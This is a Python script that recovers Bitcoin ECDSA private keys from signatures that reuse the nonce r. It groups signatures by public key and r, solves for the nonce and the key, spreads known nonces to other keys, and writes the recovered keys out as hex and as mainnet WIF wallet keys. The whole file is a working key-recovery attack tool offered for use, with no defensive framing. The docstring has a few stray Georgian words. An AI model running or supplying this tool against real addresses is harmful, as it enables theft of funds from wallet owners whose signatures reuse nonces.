#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
recover_stronger.py

Stronger ECDSA recovery that consumes ALL artifacts produced by the unified scanner.

Reads:
  - signatures.jsonl (or .json array): records with {txid, vin, pubkey_hex, r/s/z, ...}
  - recovered_k.jsonl (optional): {"r":"..","k_candidates":[...]}  (seed k per r)
  - recovered_keys.jsonl (optional): {"pubkey":"..","priv_hex":".."} (seed privs)
  - dupR_clusters.jsonl / r_collisions.jsonl (optional info; not required)

Features:
  - Primary dup-R recovery per (pub,r) cluster (>=2 sigs) with both (s1-s2) and (s1+s2) paths.
  - Iterative propagation:
      * Expand k from recovered privs over ALL their signatures; add both k and (N-k).
      * Use all known k-candidates for an r to recover any other pubs that share that r.
      * Repeat until fixed-point or --max-iter reached.
  - Can pre-seed with recovered_k.jsonl (from the unified scanner) to kickstart propagation
    even if ამ გაშვებაში დუტკა-კლასტერი არ არის.
  - Can pre-seed with recovered_keys.jsonl to widen propagation.
  - r-values filter support (r_values.txt).

Outputs (append-safe with de-dup in-memory):
  - recovered_keys.jsonl / recovered_keys.txt
  - recovered_k_out.jsonl  (union of newly learned + seeded k-ს)

Usage examples:
  python3 recover_stronger.py --sigs signatures.jsonl --seed-k recovered_k.jsonl --seed-keys recovered_keys.jsonl -v
  python3 recover_stronger.py --sigs signatures.jsonl --rlist r_values.txt --max-iter 6 -v
"""

import argparse, json, sys, os, hashlib
from collections import defaultdict
from itertools import combinations
from typing import Dict, Any, List, Tuple, Set

try:
    from coincurve import PrivateKey  # pip install coincurve
except Exception as e:
    print("[fatal] coincurve required (pip install coincurve)")
    sys.exit(1)

# ===== secp256k1 =====
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def inv(x: int) -> int: return pow(x, -1, N)

# ---- base58 WIF ----
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
_B58I = {c:i for i,c in enumerate(_B58)}
def b58encode(b: bytes) -> str:
    num = int.from_bytes(b,'big')
    out = ""
    while num>0:
        num, rem = divmod(num,58)
        out = _B58[rem] + out
    pad = 0
    for c in b:
        if c == 0: pad += 1
        else: break
    return "1"*pad + out

def to_wif(d: int, compressed: bool = True, mainnet: bool = True) -> str:
    prefix = b"\x80" if mainnet else b"\xEF"
    payload = prefix + d.to_bytes(32, "big") + (b"\x01" if compressed else b"")
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return b58encode(payload + chk)

# ---- helpers ----
def hexint(s: str) -> int:
    s = (s or "").strip().lower()
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    if s.startswith("0x"):
        s = s[2:]
    return int(s, 16)

def normalize_pub(pub_hex: str) -> str:
    s = (pub_hex or "").strip().lower()
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    return s

def parse_der_sig_plus_type(sig_hex: str) -> Tuple[int,int,int]:
    """
    Parse DER signature, optional last-byte sighash. Returns (r, s, sighash|-1).
    """
    b = bytes.fromhex(sig_hex)
    sighash = -1
    cands = [b, b[:-1]] if len(b)>=10 and b[0]==0x30 else [b]
    for blob in cands:
        try:
            if len(blob) < 9 or blob[0] != 0x30: continue
            i = 2
            if blob[i] != 0x02: continue
            lr = blob[i+1]; r = int.from_bytes(blob[i+2:i+2+lr],"big"); i += 2+lr
            if blob[i] != 0x02: continue
            ls = blob[i+1]; s = int.from_bytes(blob[i+2:i+2+ls],"big")
            if blob is b[:-1]: sighash = b[-1]
            return r%N, s%N, sighash
        except Exception:
            pass
    raise ValueError("Bad DER signature")

def derive_pub_hex(d: int) -> Tuple[str, str]:
    pk = PrivateKey(d.to_bytes(32, "big")).public_key
    return pk.format(compressed=True).hex().lower(), pk.format(compressed=False).hex().lower()

def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
    if not (1 <= s < N and 1 <= r < N and 1 <= k < N and 1 <= d < N):
        return False
    return (inv(k) * ((z + (r * d) % N) % N)) % N == (s % N)

# ---- load r filter ----
def load_rlist(path: str) -> Set[int]:
    rset: Set[int] = set()
    if not path or not os.path.exists(path): return rset
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip().strip('"')
            if not s: continue
            if s.startswith("0x"): s = s[2:]
            try: rset.add(int(s,16))
            except: pass
    return rset

# ---- load signatures (jsonl or json array) ----
def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = None, verbose: bool=False) -> List[Dict[str, Any]]:
    rows: List[Dict[str, Any]] = []
    tpub = normalize_pub(target_pub) if target_pub else ""
    rfilter = rfilter or set()

    if not os.path.exists(path):
        print(f"[error] signatures file not found: {path}")
        return rows

    with open(path, "r", encoding="utf-8") as f:
        data = f.read().strip()
        if data.startswith('"') and data.endswith('"') and "\n" not in data:
            data = data[1:-1]
        first = next((c for c in data if not c.isspace()), "")

        def push(j: Dict[str, Any]):
            pub = normalize_pub(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey") or "")
            if not pub: return
            if tpub and pub != tpub: return
            if "z" not in j: return
            try:
                z = hexint(j["z"])
            except Exception:
                return

            r_val = None; s_val = None
            if "r" in j and "s" in j:
                try:
                    r_val = hexint(j["r"]); s_val = hexint(j["s"])
                except Exception:
                    r_val = s_val = None
            if (r_val is None or s_val is None) and j.get("signature_hex"):
                try:
                    r_parsed, s_parsed, _ = parse_der_sig_plus_type(j["signature_hex"])
                    r_val, s_val = r_parsed, s_parsed
                except Exception:
                    pass
            if r_val is None or s_val is None: return
            if not (1 <= r_val < N and 1 <= s_val < N): return
            if rfilter and r_val not in rfilter: return
            try:
                vin = int(j.get("vin", 0))
            except Exception:
                vin = 0
            rows.append({
                "txid": j.get("txid",""),
                "vin": vin,
                "r": r_val, "s": s_val, "z": z,
                "pub": pub
            })

        if first == "[":
            try:
                arr = json.loads(data)
                if isinstance(arr, list):
                    for j in arr:
                        if isinstance(j, dict): push(j)
            except Exception as e:
                print(f"[error] failed to parse JSON array from {path}: {e}")
        else:
            for line in data.splitlines():
                line = line.strip()
                if not line: continue
                if line.startswith('"') and line.endswith('"'):
                    line = line[1:-1]
                try:
                    j = json.loads(line)
                except Exception:
                    continue
                if isinstance(j, dict): push(j)

    if verbose:
        print(f"[info] loaded {len(rows)} signatures from {path}"
              + (f" (r-filter {len(rfilter)})" if rfilter else ""))
    return rows

# ---- load seed K and seed keys (from unified scanner outputs) ----
def load_seed_k(path: str) -> Dict[int, Set[int]]:
    m: Dict[int, Set[int]] = defaultdict(set)
    if not path or not os.path.exists(path): return m
    with open(path,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try: j=json.loads(line)
            except: continue
            rhex = j.get("r")
            arr  = j.get("k_candidates") or j.get("k") or j.get("k_list")
            if not (rhex and arr): continue
            try: r = int(str(rhex).replace("0x",""),16)
            except: continue
            for kx in arr if isinstance(arr,list) else [arr]:
                try:
                    k = int(str(kx).replace("0x",""),16) % N
                    if 0 < k < N:
                        m[r].add(k)
                        m[r].add((N-k)%N)
                except: pass
    return m

def load_seed_keys(path: str) -> Dict[str,int]:
    d: Dict[str,int] = {}
    if not path or not os.path.exists(path): return d
    with open(path,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try: j=json.loads(line)
            except: continue
            pub = normalize_pub(j.get("pubkey") or j.get("pub") or j.get("pubkey_hex") or "")
            phx = j.get("priv_hex") or j.get("priv")
            if not (pub and phx): continue
            try:
                di = int(str(phx).replace("0x",""),16) % N
                if 1 <= di < N:
                    d[pub] = di
            except: pass
    return d

# ---- grouping helpers ----
def groups_by_r_pub(rows: List[Dict[str, Any]]):
    g = defaultdict(list)
    for rec in rows:
        g[(rec["r"], rec["pub"])].append(rec)
    return g

def by_r(rows: List[Dict[str, Any]]):
    m = defaultdict(list)
    for rec in rows:
        m[rec["r"]].append(rec)
    return m

# ---- dup-R pair recovery ----
def recover_from_pair(r: int, a: Dict[str, Any], b: Dict[str, Any]):
    s1, s2, z1, z2 = a["s"], b["s"], a["z"], b["z"]
    cands = []
    # (s1 - s2)
    denom = (s1 - s2) % N
    if denom != 0:
        k = ((z1 - z2) * inv(denom)) % N
        d = ((s1 * k - z1) * inv(r)) % N
        if 1 <= d < N and k != 0:
            cands.append((d, k, "diff"))
    # (s1 + s2)  (malleation path)
    denom2 = (s1 + s2) % N
    if denom2 != 0:
        k2 = ((z1 + z2) * inv(denom2)) % N
        d2 = ((s1 * k2 - z1) * inv(r)) % N
        if 1 <= d2 < N and k2 != 0:
            cands.append((d2, k2, "sum"))
    return cands

def add_k_candidate(r: int, k: int, store: Dict[int, Set[int]]):
    if k and 0 < k < N:
        store.setdefault(r, set()).add(k)
        store[r].add((N - k) % N)

# ---- MAIN ----
def main():
    ap = argparse.ArgumentParser(description="ECDSA recovery that uses all collected materials from unified scanner")
    ap.add_argument("--sigs", default="signatures.jsonl", help="signatures.jsonl or .json")
    ap.add_argument("--rlist", default="", help="optional r_values.txt to filter r's")
    ap.add_argument("--seed-k", action="append", default=[], help="recovered_k.jsonl (can repeat)")
    ap.add_argument("--seed-keys", action="append", default=[], help="recovered_keys.jsonl (seed privs; can repeat)")
    ap.add_argument("--pub", default="", help="optional pubkey filter (33/65 byte hex)")
    ap.add_argument("--min-count", type=int, default=2, help="min sigs per (pub,r) for primary phase")
    ap.add_argument("--max-iter", type=int, default=6, help="max propagation iterations")
    ap.add_argument("--testnet", action="store_true", help="emit testnet WIFs")
    ap.add_argument("--out-json", default="recovered_keys.jsonl", help="output JSONL (append)")
    ap.add_argument("--out-txt",  default="recovered_keys.txt",  help="output TXT (append)")
    ap.add_argument("--out-k",    default="recovered_k_out.jsonl", help="output recovered k-candidates (append)")
    ap.add_argument("-v","--verbose", action="store_true")
    args = ap.parse_args()

    # Load inputs
    rset = load_rlist(args.rlist)
    rows = load_signatures_any(args.sigs, target_pub=args.pub, rfilter=rset, verbose=args.verbose)
    if not rows:
        print("No usable signatures. Need z and r/s (or signature_hex) with pubkey_hex."); sys.exit(1)

    groups = groups_by_r_pub(rows)
    rmap   = by_r(rows)

    # Seed privs (already recovered) -> will expand k across their other sigs
    recovered_priv_by_pub: Dict[str,int] = {}
    for seed_path in args.seed_keys:
        seed_privs = load_seed_keys(seed_path)
        recovered_priv_by_pub.update(seed_privs)
    if args.verbose and recovered_priv_by_pub:
        print(f"[seed] loaded {len(recovered_priv_by_pub)} pre-recovered priv(s)")

    # Seed k-candidates per r
    recovered_k_by_r: Dict[int, Set[int]] = defaultdict(set)
    for seedk in args.seed_k:
        km = load_seed_k(seedk)
        for r, ks in km.items():
            for k in ks: add_k_candidate(r,k,recovered_k_by_r)
    if args.verbose and recovered_k_by_r:
        print(f"[seed] loaded k-candidates for {len(recovered_k_by_r)} distinct r")

    # Storage
    recovered: List[dict] = []
    seen_privs: Set[int] = set(recovered_priv_by_pub.values())
    sigs_by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for rec in rows:
        sigs_by_pub[rec["pub"]].append(rec)

    # Phase A: primary dup-R per (pub,r)
    for (r_val, pub), lst in groups.items():
        if len(lst) < args.min_count:
            if args.verbose:
                print(f"[-] singleton skipped (pub={pub[:16]}…, r={r_val:064x}, count={len(lst)})")
            continue

        if args.verbose:
            print(f"[cluster pub={pub[:16]}… r={r_val:064x}] count={len(lst)}")

        for a, b in combinations(lst, 2):
            for d, k, why in recover_from_pair(r_val, a, b):
                # verify internally
                if not (ecdsa_ok(a["s"], a["z"], r_val, d, k) and ecdsa_ok(b["s"], b["z"], r_val, d, k)):
                    continue
                try:
                    pk_c, pk_u = derive_pub_hex(d)
                except Exception:
                    continue
                if pub not in (pk_c, pk_u):
                    continue
                if d not in seen_privs:
                    seen_privs.add(d)
                    recovered_priv_by_pub[pub] = d
                    wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                    rec = {
                        "pubkey": pub, "priv_hex": f"{d:064x}", "wif": wif,
                        "r": f"{r_val:064x}",
                        "proof": [
                            {"txid": a["txid"], "vin": a["vin"]},
                            {"txid": b["txid"], "vin": b["vin"]}
                        ],
                        "method": f"primary-{why}"
                    }
                    recovered.append(rec)
                    print("="*62)
                    print(f"[RECOVERED] pub={pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
                    print("="*62)

                # collect k for this r (k and N-k)
                add_k_candidate(r_val, k, recovered_k_by_r)
                # also compute per-signature k from recovered d (consistency)
                try:
                    k_a = ((a["z"] + (r_val * d) % N) % N) * inv(a["s"]) % N
                    add_k_candidate(r_val, k_a, recovered_k_by_r)
                    k_b = ((b["z"] + (r_val * d) % N) % N) * inv(b["s"]) % N
                    add_k_candidate(r_val, k_b, recovered_k_by_r)
                except Exception:
                    pass

    # helpers for iteration
    def expand_k_from_privs() -> int:
        added = 0
        for pub, d in list(recovered_priv_by_pub.items()):
            for sig in sigs_by_pub.get(pub, []):
                r_val = sig["r"]
                try:
                    k = ((sig["z"] + (r_val * d) % N) % N) * inv(sig["s"]) % N
                except Exception:
                    continue
                before = len(recovered_k_by_r[r_val])
                add_k_candidate(r_val, k, recovered_k_by_r)
                after  = len(recovered_k_by_r[r_val])
                added += (after - before)
        return added

    def propagate_with_known_k() -> int:
        new_count = 0
        for r_val, kset in list(recovered_k_by_r.items()):
            if not kset: continue
            if args.verbose:
                print(f"[propagate r={r_val:064x}] trying {len(kset)} k-candidate(s) over {len(rmap.get(r_val, []))} signature(s)")
            for sig in rmap.get(r_val, []):
                pub = sig["pub"]
                if pub in recovered_priv_by_pub:
                    continue
                for k in list(kset):
                    try:
                        d = ((sig["s"] * k - sig["z"]) * inv(r_val)) % N
                        if not (1 <= d < N): continue
                        if not ecdsa_ok(sig["s"], sig["z"], r_val, d, k): continue
                        pk_c, pk_u = derive_pub_hex(d)
                        if pub not in (pk_c, pk_u): continue
                    except Exception:
                        continue
                    if d in seen_privs: continue
                    seen_privs.add(d)
                    recovered_priv_by_pub[pub] = d
                    wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                    rec = {
                        "pubkey": pub, "priv_hex": f"{d:064x}", "wif": wif,
                        "r": f"{r_val:064x}",
                        "proof": [{"txid": sig["txid"], "vin": sig["vin"]}],
                        "method": "propagate-from-r"
                    }
                    recovered.append(rec)
                    print("="*62)
                    print(f"[RECOVERED via propagation] pub={pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {sig['txid']}:{sig['vin']}  (r={r_val:064x})")
                    print("="*62)
                    new_count += 1
        return new_count

    # Phase B: pre-seeded privs -> expand k
    grew_k_seed = expand_k_from_privs()
    if args.verbose and grew_k_seed:
        print(f"[seed-expansion] grew_k from seeded privs: {grew_k_seed}")

    # Phase C: iterate until convergence
    iter_no = 0
    while iter_no < args.max_iter:
        iter_no += 1
        grew_k = expand_k_from_privs()
        grew_keys = propagate_with_known_k()
        if args.verbose:
            print(f"[iter {iter_no}] grew_k={grew_k}, grew_keys={grew_keys}")
        if grew_k == 0 and grew_keys == 0:
            break

    # ---- OUTPUTS (append; avoid duplicates in-memory) ----
    # 1) recovered keys
    if recovered:
        with open(args.out_json, "a", encoding="utf-8") as f:
            for rec in recovered:
                f.write(json.dumps(rec) + "\n")
        with open(args.out_txt, "a", encoding="utf-8") as f:
            for rec in recovered:
                if rec["method"].startswith("primary"):
                    via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} & {rec['proof'][1]['txid']}:{rec['proof'][1]['vin']}"
                else:
                    via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']}"
                f.write(f"PUB={rec['pubkey']} PRIV={rec['priv_hex']} WIF={rec['wif']} "
                        f"R={rec['r']} via {via} ({rec['method']})\n")
        print(f"\nSaved {len(recovered)} recovery record(s) to:")
        print(f"  {args.out_json}")
        print(f"  {args.out_txt}")
    else:
        print("No new private keys recovered in this run.")

    # 2) union of recovered k candidates per r (including seeds + newly learned)
    if recovered_k_by_r:
        with open(args.out_k, "a", encoding="utf-8") as f:
            for r_val, kset in recovered_k_by_r.items():
                if not kset: continue
                obj = {"r": f"{r_val:064x}",
                       "k_candidates": sorted({f"{k:064x}" for k in kset})}
                f.write(json.dumps(obj) + "\n")
        print(f"Saved k-candidates per r to: {args.out_k}")

if __name__ == "__main__":
    main()
